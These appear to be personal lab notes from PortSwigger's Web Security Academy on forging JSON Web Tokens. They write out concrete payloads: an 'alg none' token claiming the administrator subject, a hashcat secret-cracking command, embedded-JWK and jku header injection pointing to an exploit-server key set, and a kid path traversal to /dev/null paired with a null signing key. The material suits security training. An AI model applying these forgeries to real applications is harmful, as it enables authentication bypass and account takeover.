JWT attacks

Sometimes try just to modify the sub with the user that you need or 
try alg none changing it in the attack button

Portion off the JWT decoded

Header:
"{
    "typ": "JWT",
    "alg": "none"
}"

Payload:
"{
    "iss": "portswigger",
    "sub": "administrator",
    "exp": 1662499328
}"

Sometimes you nedd to discover the secretKey used to sign the JWT, in order to make 
other request for other users

This is the command to use:

hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list

Generate the key with the BASE64 encoded key
c2VjcmV0MQ==

And use the recent key generated to sign the JWT


In other scenario, most of the times you can generate a new key pair, with the option generate "New RSA Key" and select Attack - Embedded JWK, which sometimes it's not controlled

Other times you need to upload a key to a server, which will allow us to access some restricted areas.
in the header you need to upload the kid and add the jku(URL)

And also generate a key to sign the key

SAmple

{
    "kid": "68dc0608-6377-4721-9ec7-7a525e9a994f",
    "alg": "RS256",
    "jku": "https://exploit-0a38006504538ae2c052562d01120070.web-security-academy.net/exploit"
}


Key generated:

{
    "p": "1NtnPBmherVCYE9SgrMoOrIvYeoczQljBDHpKsi4XmHeFsQUsfY1_7PxNqxNIOxBzxvObDahhGBxyTmyR7WrTiWAYSCzy0715U4kJLuDyDFizJ-y_EnZCQ94ow8kgz26Rg0HP3F1_3KxatlLitoEvZO9ep_p-tyPbWvmg0kxK2k",
    "kty": "RSA",
    "q": "zenBdLeY6VSq5iBgZonhRTMcfgMb9jvY1xRb5OW5iQlNyKhGNIMg4uizp2fTNDUdCv9RO-0YnI-YoabDy9CDD2aQajh3F9kLUFMn269ykCkUrqA-tfveDWleFyQXLeZ0p36PUed3S1LKHNqpZePiTK_1QCwgwdlARgERL6TRVyM",
    "d": "g03xmI3Fh5sJsSnUpZLzRRlDtqZifJwB9_kccT6CfOsjp2iYJDAWT3e7gnxqNNwtV6oKG6IAr-26DxaTUMviryeVRZW6U2QwAcqhvveY-QzB2Y9XtVaUE2qTcewvDgZVLjUDIydFSi44WDtjn4Osx4SMwZF8jCW0q-9LAMmz_N1k_hU_Miob9dh5Uyl_x8K9dFW1hQLZaM4_Q5upiMSBJjswyNvO1hNcPyIzLtK9RkM3KC8xhX29dLHc_vKCae8NY4PlOWDFy6zzFXWjQWQlKxYbEw9KLIC0aMAfkadxlVUOVi7BIt1hWShfv6FG9JJvb6ogaSzaeL-mYbJyXv8x",
    "e": "AQAB",
    "kid": "68dc0608-6377-4721-9ec7-7a525e9a994f",
    "qi": "a82R5DhS809aVpQmxsP0ubcTpyjIWOgRORU8JG4sIA89pq1sbLB25j3f-yK2eBwByDHRn7gDyCi4DNdzMGj167WEB71b8GEptWmTJO0ims_duOeNiJdDxOOcN8DdC1N1PuPzY6-QhCW8gBkDGUEi5DqxIT0Anzzwxmk35IBRcsc",
    "dp": "CRgWoQq3S3bTDypUbCEbZuaV_6jw8hGkmVlIjPtmZSHpSy-1cqUCSZp2g894vB9b8G1PtG_hFrbIJcDBTS8F0qDniz7Kb7U_7DwabzdTugniHrvz-bNuAmUW0mCjPrg0bSnBVYSTdgaAbgA6qgQGj9LwFX0fkgg6WIJzpshJwYE",
    "dq": "Tl6MSY7i_NNDpAhoiD4r5bl5O6CVUNcgRWOzQeAJCFXpK9iXt768kn_8eFd0s-cPIbNgyI0Jk_S3I7cjx_uZFhB0IGlTMlliC_VKMzuIP8PS4k-M7phov_P9YpNS2x5eAa2SgJq29Y0R7X9vf58G7yb9Eap54S19X-diEh8Jqb8",
    "n": "qzYONosgtN2I3Q6XAWWdImZmw3lkJO-xpnCsqDt7hY6CRIRz5TQE_vwk6h5Te8t5hvbvnxVw_N40I9VdGpAgWuQY5UWKiDI3t9LC-5C_KUPiv6cmmQKMDsVODbBpljiSvVXf2ffW2lcoPJGwtR3xmvs2r78fApChA3FkwRVZPgfI1P5omNPHu6I3AwAL7yRBlrmdrBilZPJj1z-_5OZvySR-Fe1GkKhrEqO2Efu4ygLp3X3-rtVqwarHfD-JWLAPTHrH90vqVjnQeyXTR1wjMCylnnnHATT5PJVbbnznWHtjVZHn0iDRWfW8K-vYuxkZDX-98BNW-tWCe1QNbDKeWw"
}

Key on the exploit server:

{
    "keys": [
{
    "p": "1NtnPBmherVCYE9SgrMoOrIvYeoczQljBDHpKsi4XmHeFsQUsfY1_7PxNqxNIOxBzxvObDahhGBxyTmyR7WrTiWAYSCzy0715U4kJLuDyDFizJ-y_EnZCQ94ow8kgz26Rg0HP3F1_3KxatlLitoEvZO9ep_p-tyPbWvmg0kxK2k",
    "kty": "RSA",
    "q": "zenBdLeY6VSq5iBgZonhRTMcfgMb9jvY1xRb5OW5iQlNyKhGNIMg4uizp2fTNDUdCv9RO-0YnI-YoabDy9CDD2aQajh3F9kLUFMn269ykCkUrqA-tfveDWleFyQXLeZ0p36PUed3S1LKHNqpZePiTK_1QCwgwdlARgERL6TRVyM",
    "d": "g03xmI3Fh5sJsSnUpZLzRRlDtqZifJwB9_kccT6CfOsjp2iYJDAWT3e7gnxqNNwtV6oKG6IAr-26DxaTUMviryeVRZW6U2QwAcqhvveY-QzB2Y9XtVaUE2qTcewvDgZVLjUDIydFSi44WDtjn4Osx4SMwZF8jCW0q-9LAMmz_N1k_hU_Miob9dh5Uyl_x8K9dFW1hQLZaM4_Q5upiMSBJjswyNvO1hNcPyIzLtK9RkM3KC8xhX29dLHc_vKCae8NY4PlOWDFy6zzFXWjQWQlKxYbEw9KLIC0aMAfkadxlVUOVi7BIt1hWShfv6FG9JJvb6ogaSzaeL-mYbJyXv8x",
    "e": "AQAB",
    "kid": "68dc0608-6377-4721-9ec7-7a525e9a994f",
    "qi": "a82R5DhS809aVpQmxsP0ubcTpyjIWOgRORU8JG4sIA89pq1sbLB25j3f-yK2eBwByDHRn7gDyCi4DNdzMGj167WEB71b8GEptWmTJO0ims_duOeNiJdDxOOcN8DdC1N1PuPzY6-QhCW8gBkDGUEi5DqxIT0Anzzwxmk35IBRcsc",
    "dp": "CRgWoQq3S3bTDypUbCEbZuaV_6jw8hGkmVlIjPtmZSHpSy-1cqUCSZp2g894vB9b8G1PtG_hFrbIJcDBTS8F0qDniz7Kb7U_7DwabzdTugniHrvz-bNuAmUW0mCjPrg0bSnBVYSTdgaAbgA6qgQGj9LwFX0fkgg6WIJzpshJwYE",
    "dq": "Tl6MSY7i_NNDpAhoiD4r5bl5O6CVUNcgRWOzQeAJCFXpK9iXt768kn_8eFd0s-cPIbNgyI0Jk_S3I7cjx_uZFhB0IGlTMlliC_VKMzuIP8PS4k-M7phov_P9YpNS2x5eAa2SgJq29Y0R7X9vf58G7yb9Eap54S19X-diEh8Jqb8",
    "n": "qzYONosgtN2I3Q6XAWWdImZmw3lkJO-xpnCsqDt7hY6CRIRz5TQE_vwk6h5Te8t5hvbvnxVw_N40I9VdGpAgWuQY5UWKiDI3t9LC-5C_KUPiv6cmmQKMDsVODbBpljiSvVXf2ffW2lcoPJGwtR3xmvs2r78fApChA3FkwRVZPgfI1P5omNPHu6I3AwAL7yRBlrmdrBilZPJj1z-_5OZvySR-Fe1GkKhrEqO2Efu4ygLp3X3-rtVqwarHfD-JWLAPTHrH90vqVjnQeyXTR1wjMCylnnnHATT5PJVbbnznWHtjVZHn0iDRWfW8K-vYuxkZDX-98BNW-tWCe1QNbDKeWw"
}
    ]
}


Another way could be tricking the match of the kid with the signing key utilizing the null byte AA==

in the header of the JWT you need to add the path kid: "../../../../../../../dev/null../../../../../../../dev/null"

And generate the New Symettric key, inserting in the k the null payload as shown below:

{
    "kty": "oct",
    "kid": "0bb1bd42-6aa9-43d6-bed5-a82904b7845e",
    "k": "AA=="
}

